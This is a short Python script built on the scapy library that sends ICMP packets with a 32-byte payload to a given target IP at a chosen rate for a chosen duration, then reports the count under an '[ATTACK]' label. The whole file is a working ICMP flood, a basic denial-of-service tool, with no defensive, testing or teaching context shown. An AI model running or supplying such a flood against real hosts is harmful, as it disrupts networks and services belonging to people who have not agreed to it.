from scapy.all import IP, ICMP, Raw, send
import time

def flood(target_ip: str, pps: int, duration: float):
    packet = IP(dst=target_ip)/ICMP()/Raw(load=b"X"*32)
    interval = 1.0 / pps
    end_time = time.time() + duration
    sent = 0

    while time.time() < end_time:
        send(packet, verbose=False)
        sent += 1
        time.sleep(interval)

    print(f"[ATTACK] Finished: sent {sent} packets to {target_ip}")
